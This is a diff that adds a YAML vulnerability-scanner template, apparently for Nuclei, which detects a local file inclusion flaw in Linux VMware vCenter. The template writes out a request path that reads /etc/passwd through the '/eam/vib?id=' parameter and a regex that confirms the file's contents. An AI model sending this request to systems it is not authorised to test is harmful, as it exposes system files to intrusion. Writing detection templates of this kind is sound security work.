@@ -1,0 +1,25 @@
+http:
+    - matchers:
+        - regex:
+            - 'root:.*:0:0:'
+          type: regex
+      method: GET
+      path:
+        - '{{BaseURL}}/eam/vib?id=/etc/passwd'
+id: vmware-vcenter-lfi-linux
+info:
+    author: PR3R00T
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+        cvss-score: 7.5
+        cwe-id: CWE-22
+    description: Linux appliance based Vmware Vcenter is vulnerable to local file inclusion.
+    metadata:
+        max-request: 1
+    name: Linux Vmware Vcenter - Local File Inclusion
+    severity: high
+    tags:
+        - vmware
+        - vcenter
+        - linux
+        - VMware-vCenter
